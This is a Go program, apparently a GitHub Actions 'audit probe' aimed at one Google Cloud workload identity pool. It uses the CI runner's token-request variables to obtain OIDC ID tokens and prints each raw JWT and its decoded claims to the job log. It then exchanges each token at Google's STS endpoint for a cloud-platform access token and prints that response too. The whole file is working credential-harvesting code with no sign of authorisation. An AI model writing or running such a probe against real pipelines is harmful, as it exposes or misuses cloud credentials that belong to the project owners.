package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

const provider = "//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider"

var audiences = []string{
	"https://iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
	"//iam.googleapis.com/projects/597679076120/locations/global/workloadIdentityPools/github-actions/providers/gh-provider",
}

func decodePayload(jwt string) string {
	parts := strings.Split(jwt, ".")
	if len(parts) != 3 {
		return "decode-failed"
	}
	b, err := base64.RawURLEncoding.DecodeString(parts[1])
	if err != nil {
		// try padded
		b, err = base64.URLEncoding.DecodeString(parts[1])
		if err != nil {
			return "decode-failed: " + err.Error()
		}
	}
	return string(b)
}

func main() {
	fmt.Println("=== WIF-AUDIT PROBE START ===")
	reqURL := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_URL")
	reqTok := os.Getenv("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
	fmt.Println("have_id_token_url:", reqURL != "")
	if reqURL == "" {
		fmt.Println("no ACTIONS_ID_TOKEN_REQUEST_URL (no id-token perm)")
		fmt.Println("=== WIF-AUDIT PROBE END ===")
		return
	}
	client := &http.Client{Timeout: 45 * time.Second}

	for _, aud := range audiences {
		fmt.Println("---- AUDIENCE:", aud)
		u := reqURL + "&audience=" + url.QueryEscape(aud)
		req, _ := http.NewRequest("GET", u, nil)
		req.Header.Set("Authorization", "bearer "+reqTok)
		req.Header.Set("Accept", "application/json")
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("oidc request error:", err)
			continue
		}
		b, _ := io.ReadAll(resp.Body)
		resp.Body.Close()
		fmt.Println("OIDC_HTTP:", resp.StatusCode)
		fmt.Println("OIDC_RAW:", string(b))
		var oidc struct {
			Value string `json:"value"`
		}
		json.Unmarshal(b, &oidc)
		jwt := oidc.Value
		if jwt == "" {
			continue
		}
		fmt.Println("OIDC_JWT:", jwt)
		fmt.Println("OIDC_PAYLOAD:", decodePayload(jwt))

		body := map[string]string{
			"audience":           provider,
			"grantType":          "urn:ietf:params:oauth:grant-type:token-exchange",
			"requestedTokenType": "urn:ietf:params:oauth:token-type:access_token",
			"scope":              "https://www.googleapis.com/auth/cloud-platform",
			"subjectTokenType":   "urn:ietf:params:oauth:token-type:jwt",
			"subjectToken":       jwt,
		}
		bj, _ := json.Marshal(body)
		r2, _ := http.NewRequest("POST", "https://sts.googleapis.com/v1/token", bytes.NewReader(bj))
		r2.Header.Set("Content-Type", "application/json")
		resp2, err := client.Do(r2)
		if err != nil {
			fmt.Println("sts error:", err)
			continue
		}
		b2, _ := io.ReadAll(resp2.Body)
		resp2.Body.Close()
		fmt.Println("STS_STATUS:", resp2.StatusCode)
		fmt.Println("STS_RESPONSE:", string(b2))
	}
	fmt.Println("=== WIF-AUDIT PROBE END ===")
}
